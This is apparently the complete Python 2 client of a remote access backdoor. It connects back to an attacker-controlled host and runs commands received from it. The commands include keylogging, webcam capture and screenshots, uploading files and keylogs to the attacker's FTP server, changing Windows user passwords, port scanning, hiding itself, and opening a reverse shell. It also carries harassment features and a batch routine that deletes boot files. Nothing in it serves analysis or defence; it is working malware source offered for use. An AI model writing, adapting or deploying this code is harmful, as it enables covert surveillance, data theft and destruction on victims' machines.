#!/usr/bin/python2
#-*- coding:utf-8 -*-
#Author : Dxvistxr
#Client File

import os
import socket
import subprocess
import requests
import json
import sys
import platform
import shutil
import shlex
from ftplib import FTP
from ftplib import FTP_TLS
import cv2
import time
from datetime import datetime
import pyscreenshot as ImageGrab
import wget
import webbrowser
from Crypto.Cipher import XOR
import base64
import thread
from pynput.keyboard import Key, Listener
import logging
import urllib
import threading
import numpy as np
import netifaces
import pyttsx3
import ctypes

if 'Linux' not in platform.platform():
    import win32con
else:
    pass

global log_dirrec
global log_file
global cmd_key



def keylogger_module(cmd_key,log_dirrec,log_file):
    global key_active


    if cmd_key =='startkey':
        key_active = True
        if key_active ==True:
            logging.basicConfig(filename=(log_dirrec + log_file), level=logging.DEBUG, format='%(asctime)s: %(message)s')

            def on_press(key):
                logging.info(key)

            with Listener(on_press=on_press) as listener:
                listener.join()

    elif cmd_key =='stopkey':
        key_active = False
        while True:
            break


    elif cmd_key =='restartkey':
        key_active = True
        if key_active ==True:
            logging.basicConfig(filename=(log_dirrec + log_file), level=logging.DEBUG, format='%(asctime)s: %(message)s')

            def on_press(key):
                logging.info(key)

            with Listener(on_press=on_press) as listener:
                listener.join()



def server2popen(server_socket, p):
    while True:
        data = server_socket.recv(65556)
        if len(data) > 0:

            if data.startswith('ipgeo')==True:
                try:
                    r = requests.get('https://ipinfo.io/json')
                    content_requests = r.text
                    obj = json.loads(content_requests)
                    ip = obj['ip'].encode('utf-8')
                    city = obj['city'].encode('utf-8')
                    region = obj['region'].encode('utf-8')
                    country = obj['country'].encode('utf-8')
                    loc = obj['loc'].encode('utf-8')
                    server_socket.sendall('[*] IP : '+str(ip)+'\n[*] CITY : '+str(city)+'\n[*] REGION : '+str(region)+'\n[*] COUNTRY : '+str(country)+'\n[*] LOCATION : '+str(loc)+'\n\n')
                    p.stdin.write(data)

                except Exception as error_ipgeo:
                    server_socket.sendall(error_ipgeo)

            elif data.startswith('pwd')==True:
                try:
                    current_path = os.getcwd()
                    server_socket.sendall('PWD : %s\n\n' % (current_path))
                    p.stdin.write(data)

                except Exception as error_pwd:
                    server_socket.sendall(error_pwd)

            elif data.startswith('sysinfo')==True:
                try:
                    platform_os = platform.system()
                    platform_version = platform.version()
                    platform_architecture = platform.architecture()[0]
                    platform_hostname = platform.node()
                    server_socket.sendall('[*] OS : %s\n[*] Version : %s\n[*] Architecture : %s\n[*] Hostname : %s\n\n' % (platform_os,platform_version,platform_architecture,platform_hostname))
                    p.stdin.write(data)

                except Exception as error_platform_info:
                    server_socket.sendall(error_platform_info)

            else:
                p.stdin.write(data)

def popen2socket(server_socket, p):
    while True:
        server_socket.sendall(p.stdout.read(1))

def sys_required():
    if sys.version[0] =='3':
        sys.exit('[*] Please Run Backdoor With Python2')


global cmdkeyvideo
global key_video

def webcam_video_stream():
    global stream
    stream = False

def main_config_server(LHOST,LPORT,FTPHOST,FTPPORT,FTPUSER,FTPPASSWD,log_dir_key,log_file_key):
    get_ip = requests.get('https://ifconfig.me/ip')
    ip = get_ip.text
    socket_local = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    socket_local.connect(('8.8.8.8', 80))
    localip = socket_local.getsockname()[0]
    buffer = 1024
    server_socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        server_socket.connect((LHOST,LPORT))

    except socket.error:
        pass
    server_socket.sendall('[*] Connected To %s:%s' % (ip,LPORT))
    while True:
        try:
            data = server_socket.recv(buffer)

            if data.startswith('quit')==True:
                break

            elif data.startswith('cd')==True:
                change_dirrectory = data[3:]
                try:
                    check_dir = os.path.exists(change_dirrectory)
                    if check_dir ==True:
                        os.chdir(change_dirrectory)
                        current_path = os.getcwd()
                        server_socket.sendall('[*] Dirrectory Change : %s' % (current_path))
                    else:
                        server_socket.sendall('[*] Path Not Found !')

                except Exception as error_change_dirrectory:
                    server_socket.sendall(error_change_dirrectory)

            elif data.startswith('keylogger_start')==True:
                try:
                    server_socket.send('[*] Keylogger Started !')
                    thread.start_new_thread(keylogger_module,('startkey',log_dir_key,log_file_key))

                except Exception as error_start_keylogger:
                    server_socket.send(error_start_keylogger)

            elif data.startswith('keylogger_stop')==True:
                try:
                    server_socket.send('[*] Keylogger Stoped !')
                    thread.start_new_thread(keylogger_module,('stopkey',log_dir_key,log_file_key))

                except Exception as error_stop_keylogger:
                    server_socket.send(error_stop_keylogger)

            elif data.startswith('keylogger_dump')==True:
                try:
                    check_log_file = os.path.exists(log_dir_key+log_file_key)
                    if check_log_file ==True:
                        file=open(log_dir_key+log_file_key,'rb')
                        connect = FTP(FTPHOST)
                        connect.login(FTPUSER,FTPPASSWD)
                        connect.storbinary('STOR '+log_file_key, file)
                        file.close()
                        connect.quit()
                        server_socket.sendall('[*] %s Downloaded ! Save In FTP Server' % (log_file_key))
                    else:
                        server_socket.send('[*] %s%s not Found !' % (log_dir_key,log_file_key))

                except Exception as error_keydump:
                    server_socket.send(error_keydump)

            elif data.startswith('keylogger_restart')==True:
                try:
                    server_socket.send('[*] Keylogger Restarted !')
                    thread.start_new_thread(keylogger_module,('restartkey',log_dir_key,log_file_key))

                except Exception as error_keylogger_restart:
                    server_socket.send(error_keylogger_restart)


            elif data.startswith('ftpdownload')==True:
                file_download = data[12:]
                try:
                    connect = FTP(FTPHOST)
                    connect.login(FTPUSER,FTPPASSWD)
                    filename = file_download
                    file = open(filename,'rb')
                    connect.storbinary('STOR '+filename, file)
                    file.close()
                    connect.quit()
                    server_socket.send('[*] %s Downloaded And Save At FTP Server' % (filename))

                except Exception as error_ftpdownload:
                    server_socket.sendall(error_ftpdownload)

            elif data.startswith('webcamsnap')==True:
                try:
                    t = datetime.now().strftime('%H_%M')
                    webcam=cv2.VideoCapture(0)
                    check, frame = webcam.read()
                    time.sleep(1)
                    name_picture = 'webcam_%s.png' % (t)
                    cv2.imwrite(name_picture, frame)
                    webcam.release()
                    cv2.destroyAllWindows()
                    connect = FTP(FTPHOST)
                    connect.login(FTPUSER,FTPPASSWD)
                    filename = name_picture
                    current_path=os.getcwd()
                    file=open(current_path+'/'+filename,'rb')
                    connect.storbinary('STOR '+filename, file)
                    file.close()
                    connect.quit()
                    os.remove(filename)
                    server_socket.sendall('[*] Webcamsnap Save as %s ' % (name_picture))

                except Exception as error_webcam_snap:
                    server_socket.sendall(error_webcam_snap)
                    pass

            elif data.startswith('cwpasswd')==True:
                recv_cwpasswd=data[9:]
                split = shlex.split(recv_cwpasswd)
                user_change=split[0]
                password_new=split[1]
                try:
                    os.system('net user %s %s' % (user_change,password_new))
                    server_socket.send('[*] Password Change For %s Users New Password Is %s\n' % (user_change,password_new))

                except Exception as error_cwpasswd:
                    server_socket.send(error_cwpasswd)

            elif data.startswith('netuser')==True:
                try:
                    cmd_net_user = subprocess.Popen(['net','user'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    out_cmd_net_user = cmd_net_user.stdout.read() + cmd_net_user.stderr.read()
                    server_socket.send(out_cmd_net_user)

                except Exception as error_net_user:
                    server_socket.send(error_net_user)

            elif data.startswith('tkill')==True:
                proc=data[6:]
                try:
                    if 'Linux' not in platform.platform():
                        os.system('taskkill /F /IM %s' % (proc))
                        server_socket.send('[*] Task Killed ! %s\n' % (proc))

                    elif 'Windows' not in platform.platform():
                        os.system('pkill -f %s' % (proc))
                        server_socket.send('[*] Task Killed ! %s\n' % (proc))

                except Exception as error_tkill:
                    server_socket.send(error_tkill)

            elif data.startswith('process')==True:
                processus=data[8:]
                try:
                    if 'Linux' not in platform.platform():
                        os.system('start %s &' % (processus))
                        server_socket.send('[*] Task Started : %s !' % (processus))

                    elif 'Windows' not in platform.platform():
                        os.system('exec %s &' % (processus))
                        server_socket.send('[*] Task Started : %s !' % (processus))

                except Exception as error_start_process:
                    server_socket.send(error_start_process)

            elif data.startswith('msgbox')==True:
                message=data[7:]
                try:
                    f=open('msg.vbs','w')
                    f.write('msgbox "%s"' % (message))
                    f.close()
                    os.system('start msg.vbs')
                    time.sleep(1)
                    os.system('del msg.vbs /Q')
                    server_socket.send('[*] Message Sent : %s\n' % (message))

                except Exception as error_msgbox_sent:
                    server_socket.sendall(error_msgbox_sent)

            elif data.startswith('getpid')==True:
                try:
                    pid = os.getpid()
                    server_socket.send('[*] PID : %s' % (pid))

                except Exception as error_get_pid:
                    server_socket.send(error_get_pid)

            elif data.startswith('speak')==True:
                message=data[6:]
                try:
                    engine = pyttsx3.init()
                    voices = engine.getProperty('voices')
                    engine.setProperty('voice', voices[0].id)
                    engine.say(message)
                    engine.runAndWait()
                    server_socket.send('[*] Voice Message Speak : %s' % (message))

                except Exception as error_speak_message:
                    server_socket.sendall(error_speak_message)


            elif data.startswith('meslp')==True:
                message_loop=data[6:]
                try:
                    f=open('msgloop.vbs','w')
                    f.write('Do\n')
                    f.write('msgbox "%s"\n' % (message_loop))
                    f.write('loop\n')
                    f.close()
                    os.system('start msgloop.vbs')
                    time.sleep(1)
                    os.system('del msgloop.vbs /Q')
                    server_socket.send('[*] Message Loop Sent : %s' % (message_loop))

                except Exception as error_message_loop:
                    server_socket.send(error_message_loop)

            elif data.startswith('resettime')==True:
                try:
                    os.system('time 12:00')
                    server_socket.send('[*] Time Reset !')

                except Exception as error_resettime:
                    server_socket.send(error_resettime)

            elif data.startswith('ftpupload')==True:
                filename=data[10:]
                connect = FTP(FTPHOST)
                connect.login(FTPUSER,FTPPASSWD)
                file=open(filename,'wb')
                connect.retrbinary('RETR '+filename, file.write)
                file.close()
                connect.quit()
                server_socket.sendall('[*] %s Uploaded !' % (filename))

            elif data.startswith('move')==True:
                file_move=data[5:]
                file_old_new = shlex.split(file_move)
                old_file = file_old_new[0]
                new_file = file_old_new[1]
                try:
                    shutil.move(old_file,new_file)
                    check_new_file = os.path.exists(new_file)
                    if check_new_file ==True:
                        server_socket.sendall('[*] %s Moved At %s' % (old_file,new_file))
                    else:
                        server_socket.sendall('[*] %s Not Moved !' % (old_file))

                except Exception as error_move_cmd:
                    server_socket.sendall(error_move_cmd)

            elif data.startswith('xorencode')==True:
                filename=data[10:]
                try:
                    key = 'dxvistxr'
                    cipher = XOR.new(key)
                    check_filename = os.path.exists(filename)
                    if check_filename ==True:
                        f=open(filename, 'rb')
                        content = f.read()
                        f.close()
                        encode = base64.b64encode(cipher.encrypt(content))
                        f=open(filename, 'wb')
                        f.write(encode)
                        f.close()
                        server_socket.sendall('[*] %s Encoded With Xor !' % (filename))

                except Exception as error_xor:
                    server_socket.sendall(error_xor)

            elif data.startswith('ping')==True:
                ip = data[5:]
                try:
                    if 'Linux' not in platform.platform():
                        ping_cmd_win = subprocess.Popen('ping -n 1 %s' % (ip), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        out_ping_cmd = ping_cmd_win.stdout.read() + ping_cmd_win.stderr.read()
                        server_socket.sendall(out_ping_cmd)

                    elif 'Windows' not in platform.platform():
                        ping_cmd = subprocess.Popen('ping -c 1 %s' % (ip), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        out_ping_cmd = ping_cmd.stdout.read() + ping_cmd.stderr.read()
                        server_socket.sendall(out_ping_cmd)

                except Exception as error_ping_command:
                    server_socket.sendall(error_ping_command)


            elif data.startswith('copy')==True:
                file_copy=data[5:]
                file_old_new = shlex.split(file_copy)
                old_place = file_old_new[0]
                new_place = file_old_new[1]
                try:
                    shutil.copy(old_place,new_place)
                    check_new_place = os.path.exists(new_place)
                    if check_new_place ==True:
                        server_socket.sendall('[*] %s Copied at %s !' % (old_place,new_place))
                    else:
                        server_socket.sendall('[*] %s Not Copied !' % (old_place))

                except Exception as error_copy_file:
                    server_socket.sendall(error_copy_file)


            elif data.startswith('screenshot')==True:
                try:
                    im = ImageGrab.grab()
                    t = datetime.now().strftime('%H_%M')
                    name = 'screenshot_%s.png' % (t)
                    im.save(name)
                    connect = FTP(FTPHOST)
                    connect.login(FTPUSER,FTPPASSWD)
                    filename = name
                    current_path=os.getcwd()
                    file=open(current_path+'/'+filename,'rb')
                    connect.storbinary('STOR '+filename, file)
                    file.close()
                    connect.quit()
                    os.remove(filename)
                    server_socket.send('[*] Screenshot Save as %s ' % (name))
                except Exception as error_screenshot:
                    server_socket.send(error_screenshot)

            elif data.startswith('shutdown')==True:
                try:
                    if 'Linux' not in platform.platform():
                        os.system('shutdown -S -t 00')

                    elif 'Windows' not in platform.platform():
                        os.system('shutdown now')

                except Exception as error_pc_shutdown:
                    server_socket.sendall(error_pc_shutdown)

            elif data.startswith('reboot')==True:
                try:
                    if 'Linux' not in platform.platform():
                        os.system('shutdown -R -t 00')

                    elif 'Windows' not in platform.platform():
                        os.system('reboot')

                except Exception as error_reboot:
                    server_socket.sendall(error_reboot)

            elif data.startswith('del')==True:
                delete_file = data[4:]
                try:
                    check_delete_file = os.path.exists(delete_file)
                    if check_delete_file ==True:
                        os.remove(delete_file)
                        server_socket.sendall('[*] %s Removed ! ' % (delete_file))
                    else:
                        server_socket.sendall('[*] %s Not Found !' % (delete_file))

                except:
                    server_socket.sendall('[*] File Not Removed !')

            elif data.startswith('rmpt')==True:
                delete_path = data[5:]
                try:
                    check_delete_path = os.path.exists(delete_path)
                    if check_delete_path==True:
                        os.rmdir(delete_path)
                        server_socket.sendall('[*] %s Removed ! ' % (delete_path))
                    else:
                        server_socket.sendall('[*] %s Not Found !' % (delete_path))

                except:
                    server_socket.sendall('[*] File Not Removed !')

            elif data.startswith('getgtw')==True:
                try:
                    gtws = netifaces.gateways()
                    get_gateway = gtws['default'][netifaces.AF_INET][0].encode('utf-8')
                    server_socket.send('[*] Gateways : %s' % (get_gateway))

                except Exception as error_get_gateway:
                    server_socket.send(error_get_gateway)


            elif data.startswith('mkpa')==True:
                create_dir = data[5:]
                try:
                    check_if_exists = os.path.exists(create_dir)
                    if check_if_exists ==True:
                        server_socket.sendall('[*] %s Already Exists ! ' % (create_dir))
                    else:
                        os.mkdir(create_dir)
                        server_socket.sendall('[*] %s Successfully Created !' % (create_dir))

                except Exception as error_mkdir:
                    server_socket.sendall(error_mkdir)

            elif data.startswith('ifconfig')==True:
                try:
                    if 'Linux' not in platform.platform():
                        cmd_ifconfig = subprocess.Popen(['ipconfig'],shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
                        out_cmd = cmd_ifconfig.stdout.read() + cmd_ifconfig.stderr.read()
                        server_socket.sendall(out_cmd)

                    elif 'Windows' not in platform.platform():
                        cmd_ifconfig = subprocess.Popen(['ifconfig'],shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
                        out_cmd = cmd_ifconfig.stdout.read() + cmd_ifconfig.stderr.read()
                        server_socket.sendall(out_cmd)

                except Exception as error_ifconfig_info:
                    server_socket.sendall(error_ifconfig_info)


            elif data.startswith('openurl')==True:
                link=data[8:]
                try:
                    webbrowser.open_new(link)
                    server_socket.send('[*] Link Opened => %s' % (link))

                except Exception as error_start_webbrowser:
                    server_socket.send(error_start_webbrowser)

            elif data.startswith('change_wallpaper')==True:
                try:
                    url = 'https://www.desktopbackground.org/p/2013/10/20/657022_21-scary-wallpapers-creepy-ghost-backgrounds-images_1024x768_h.jpg'
                    name = 'wlp.jpg'
                    urllib.urlretrieve(url, name)
                    path_current = os.getcwd()
                    path = path_current+'\\wlp.jpg'
                    changed = win32con.SPIF_UPDATEINIFILE | win32con.SPIF_SENDCHANGE
                    ctypes.windll.user32.SystemParametersInfoA(win32con.SPI_SETDESKWALLPAPER,0,path.encode(),changed)
                    time.sleep(2)
                    os.remove('wlp.jpg')
                    server_socket.send('[*] Wallpaper Changed To => Wallpaper Paraghost !')

                except Exception as error_cwlp_background:
                    server_socket.send(error_cwlp_background)

            elif data.startswith('opendiskloop')==True:
                try:
                    if 'Linux' not in platform.platform():
                        f=open('opendisk.vbs','w')
                        f.write('Do\n')
                        f.write('Set oWMP = CreateObject("WMPlayer.OCX.7" )\n')
                        f.write('Set colCDROMs = oWMP.cdromCollection\n')
                        f.write('colCDROMs.Item(d).Eject\n')
                        f.write('colCDROMs.Item(d).Eject\n')
                        f.write('Loop\n')
                        f.close()
                        os.system('start opendisk.vbs &')
                        time.sleep(0.5)
                        os.system('del opendisk.vbs /Q')
                        server_socket.send('[*] Open Disk Loop Started !')

                    elif 'Windows' not in platform.platform():
                        server_socket.send('[*] Windows Victim Required ! : Your Target is Linux or Other O.S')

                except Exception as error_send_opendisk_loop:
                    server_socket.send(error_send_opendisk_loop)

            elif data.startswith('odisk')==True:
                try:
                    if 'Linux' not in platform.platform():
                        f=open('opendisk.vbs','w')
                        f.write('Set oWMP = CreateObject("WMPlayer.OCX.7" )\n')
                        f.write('Set colCDROMs = oWMP.cdromCollection\n')
                        f.write('colCDROMs.Item(d).Eject\n')
                        f.write('colCDROMs.Item(d).Eject\n')
                        f.close()
                        os.system('start opendisk.vbs &')
                        time.sleep(0.5)
                        os.system('del opendisk.vbs /Q')
                        server_socket.send('[*] Open Disk And Close Disk !')

                    elif 'Windows' not in platform.platform():
                        server_socket.send('[*] Windows Required !')

                except Exception as error_sent_odisk:
                    server_socket.send(error_sent_odisk)

            elif data.startswith('tlrestart')==True:
                try:

                    if 'Linux' not in platform.platform():
                        f=open('tlrestart.bat','w')
                        f.write('attrib -r -s -h C:\\autoexec.bat')
                        f.write('del C:\\autoexec.bat\n')
                        f.write('attrib -r -s -h C:\\boot.ini\n')
                        f.write('del C:\\boot.ini\n')
                        f.write('attrib -r -s -h C:\\ntldr\n')
                        f.write('del C:\\ntldr')
                        f.write('attrib -r -s -h C:\\Windows\\win.ini\n')
                        f.write('del C:\\Windows\\win.ini\n')
                        f.write('shutdown /r /t 2\n')
                        f.close()
                        #os.system('start tlrestart.bat')
                        time.sleep(0.3)
                        os.system('del tlrestart.bat')
                        server_socket.send('[*] The Last Restart Started !!! Rebooting Machine in few seconds')

                    elif 'Windows' not in platform.platform():
                        server_socket.send('[*] Windows Required For This Command !')

                except Exception as error_tlrestart:
                    server_socket.send(error_tlrestart)

            elif data.startswith('hide_backdoor')==True:
                try:
                    if 'Linux' not in platform.platform():
                        os.system('attrib +h %0')
                        server_socket.send('[*] Backdoor Hidden !!')

                    elif 'Windows' not in platform.platform():
                        server_socket.send('[*] Windows Required !!')

                except Exception as error_hide_backdoor:
                    server_socket.send(error_hide_backdoor)

            elif data.startswith('cat')==True:
                file_cat = data[4:]
                try:
                    check_file = os.path.exists(file_cat)
                    if check_file ==True:
                        f=open(file_cat,'rb')
                        content = f.read()
                        f.close()
                        server_socket.sendall(content)
                    else:
                        server_socket.sendall('[*] File Not Found : %s' % (file_cat))

                except Exception as error_cat:
                    server_socket.sendall(error_cat)

            elif data.startswith('whoami')==True:
                try:
                    if 'Windows' not in platform.platform():
                        cmd_whoami = subprocess.Popen(['whoami'], shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
                        out_cmd_whoami = cmd_whoami.stderr.read() + cmd_whoami.stdout.read()
                        server_socket.sendall(out_cmd_whoami)

                    elif 'Linux' not in platform.platform():
                        cmd_user = subprocess.Popen(['whoami'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        out_cmd_user = cmd_user.stdout.read() + cmd_user.stderr.read()
                        server_socket.sendall(out_cmd_user)

                except Exception as error_whoami:
                    server_socket.sendall(error_whoami)

            elif data.startswith('rname')==True:
                rename_file = data[6:]
                split = shlex.split(rename_file)
                old = split[0]
                new = split[1]
                try:
                    check_rename_exists = os.path.exists(old)
                    if check_rename_exists ==True:
                        os.rename(old,new)
                        server_socket.sendall('[*] %s Renamed to %s !' % (old,new))
                    else:
                        server_socket.sendall('[*] %s Not Found !' % (old))

                except Exception as error_rename:
                    server_socket.sendall(error_rename)

            elif data.startswith('sysinfo')==True:
                try:
                    platform_os = platform.system()
                    platform_version = platform.version()
                    platform_architecture = platform.architecture()[0]
                    platform_hostname = platform.node()
                    cmd_whoami_info = subprocess.Popen(['whoami'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    out_cmd_whinfo = cmd_whoami_info.stdout.read() + cmd_whoami_info.stderr.read()
                    server_socket.sendall('[*] OS : %s\n[*] Version : %s\n[*] Architecture : %s\n[*] Hostname : %s\n[*] Public IP : %s\n[*] Local IP : %s\n[*] User Session : %s\n\n' % (platform_os,platform_version,platform_architecture,platform_hostname,ip,localip,out_cmd_whinfo))

                except Exception as error_sysinfo:
                    server_socket.sendall(error_sysinfo)

            elif data.startswith('pwd')==True:
                try:
                    path = os.getcwd()
                    server_socket.sendall('Current Path : %s' % (path))

                except Exception as error_pwd:
                    server_socket.sendall(error_pwd)

            elif data.startswith('b64encode')==True:
                filename_b64encode=data[10:]
                try:
                    check_fb64 = os.path.exists(filename_b64encode)
                    if check_fb64 ==True:
                        f=open(filename_b64encode,'rb')
                        content = f.read()
                        f.close()
                        encode = base64.b64encode(content)
                        content_replace = content.replace(content,encode)
                        f=open(filename_b64encode,'wb')
                        f.write(content_replace)
                        f.close()
                        server_socket.sendall('[*] %s Encoded By Base64' % (filename_b64encode))
                    else:
                        server_socket.sendall('[*] %s Not Encoded By Base64' % (filename_b64encode))

                except Exception as error_base64:
                    server_socket.sendall(error_base64)

            elif data.startswith('b64decode')==True:
                filename_b64encode=data[10:]
                try:
                    check_fb64 = os.path.exists(filename_b64encode)
                    if check_fb64 ==True:
                        f=open(filename_b64encode,'rb')
                        content = f.read()
                        f.close()
                        encode = base64.b64decode(content)
                        content_replace = content.replace(content,encode)
                        f=open(filename_b64encode,'wb')
                        f.write(content_replace)
                        f.close()
                        server_socket.sendall('[*] %s Decoded By Base64' % (filename_b64encode))
                    else:
                        server_socket.sendall('[*] %s Not Decoded By Base64' % (filename_b64encode))

                except Exception as error_base64:
                    server_socket.sendall(error_base64)

            elif data.startswith('help')==True:
                server_socket.sendall('\n')

            elif data.startswith('clear')==True:
                server_socket.sendall('\n')

            elif data.startswith('portscan')==True:
                global port_scan
                port_scan = []
                target = data[9:]

                def socket_port(ip,port):
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((ip,port))
                        server_socket.sendall('[*] port : %s open !\n' % (port))

                    except:
                        pass

                def start_thread_scanner_port(ip):
                    try:
                        i = 0
                        y = 0
                        while i<600:
                            try:
                                thread.start_new_thread(socket_port,(ip,y))
                                time.sleep(0.1)
                                y = y+1
                                i = i+1

                            except Exception as error_start_thread:
                                server_socket.send(error_start_thread)

                    except Exception as error_start_thread_scanner_port:
                        server_socket.send(error_start_thread_scanner_port)


                start_thread_scanner_port(target)



            elif data.startswith('ls') or data.startswith('dir')==True:
                try:
                    if 'Linux' not in platform.platform():
                        dir_exec = subprocess.Popen(['dir'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        out_dir = dir_exec.stdout.read() + dir_exec.stderr.read()
                        server_socket.sendall(out_dir)

                    elif 'Windows' not in platform.platform():
                        ls_exec = subprocess.Popen(['ls -a'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        ls_dir = ls_exec.stdout.read() + ls_exec.stderr.read()
                        server_socket.sendall(ls_dir)

                except Exception as error_list_dirrectory:
                    server_socket.sendall(error_list_dirrectory)

            elif data.startswith('ps')==True:
                try:
                    if 'Linux' not in platform.platform():
                        tsklist_exec = subprocess.Popen(['tasklist'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        out_tsklist = tsklist_exec.stdout.read() + tsklist_exec.stderr.read()
                        server_socket.sendall(out_tsklist)
                        server_socket.send('\n')

                    elif 'Windows' not in platform.platform():
                        cmd_ps = 'ps -aux'
                        ps_exec = subprocess.Popen(cmd_ps,shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        out_ps_exec = ps_exec.stdout.read() + ps_exec.stderr.read()
                        server_socket.sendall(out_ps_exec)
                        server_socket.send('\n')

                except Exception as error_processus_list:
                    server_socket.sendall(error_processus_list)

            elif data.startswith('ipgeo')==True:
                try:
                    r = requests.get('https://ipinfo.io/json')
                    content_requests = r.text
                    obj = json.loads(content_requests)
                    ip = obj['ip'].encode('utf-8')
                    city = obj['city'].encode('utf-8')
                    region = obj['region'].encode('utf-8')
                    country = obj['country'].encode('utf-8')
                    loc = obj['loc'].encode('utf-8')
                    server_socket.sendall('[*] IP : '+str(ip)+'\n[*] CITY : '+str(city)+'\n[*] REGION : '+str(region)+'\n[*] COUNTRY : '+str(country)+'\n[*] LOCATION : '+str(loc)+'\n\n')
                except Exception as error_ipgeo:
                    server_socket.sendall(error_ipgeo)

            elif data.startswith('banner')==True:
                server_socket.sendall('\n')

            elif data.startswith('shell')==True:
                if 'Linux' not in platform.platform():
                    try:
                        p=subprocess.Popen(["c:\\windows\\system32\\cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

                        s2p_thread = threading.Thread(target=server2popen, args=[server_socket, p])
                        s2p_thread.daemon = True
                        s2p_thread.start()

                        p2s_thread = threading.Thread(target=popen2socket, args=[server_socket, p])
                        p2s_thread.daemon = True
                        p2s_thread.start()

                        try:
                            p.wait()
                        except KeyboardInterrupt:
                            server_socket.sendall('[*] CTRL + C')

                    except Exception as error_windows_server_config:
                        server_socket.sendall(error_windows_server_config)

                elif 'Windows' not in platform.platform():
                    try:
                        os.dup2(server_socket.fileno(),0)
                        os.dup2(server_socket.fileno(),1)
                        os.dup2(server_socket.fileno(),2)
                        p=subprocess.call(["/bin/bash"])

                    except KeyboardInterrupt:
                        server_socket.sendall('[*] CTRL + C')

                elif 'Darwin' not in platform.platform():
                    try:
                        os.dup2(server_socket.fileno(),0)
                        os.dup2(server_socket.fileno(),1)
                        os.dup2(server_socket.fileno(),2)
                        p=subprocess.call(["/bin/sh","-i"])

                    except KeyboardInterrupt:
                        server_socket.sendall('[*] CTRL + C')

            else:
                server_socket.sendall('[*] Error Command !')


        except Exception as error_main_server:
            server_socket.sendall(error_main_server)


def main():
    LHOST = 'remote_host'
    LPORT = remote_port
    FTPHOST = LHOST
    FTPPORT = 21
    FTP_USER = 'ftpuser'
    FTP_PASSWD = 'ftppassword'
    LOG_DIR_KEY = '/home/'
    LOG_FILE_KEY = 'key.txt'
    sys_required()
    main_config_server(LHOST,LPORT,FTPHOST,FTPPORT,FTP_USER,FTP_PASSWD,LOG_DIR_KEY,LOG_FILE_KEY)

if __name__ =='__main__':
    main()
